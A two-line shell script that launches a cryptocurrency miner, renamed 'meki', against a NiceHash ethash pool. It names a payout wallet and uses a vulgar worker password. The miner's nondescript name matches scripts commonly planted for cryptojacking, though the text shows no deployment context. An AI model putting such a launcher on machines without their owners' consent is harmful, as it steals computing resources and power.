#!/bin/sh
./meki -a ethash -o stratum+tcp://daggerhashimoto.eu-north.nicehash.com:3353 -u 3DjXrJEAkJJLqNUMouiQoZyNUyctd1pDRB -p kuntulkuda -w kuntulkuda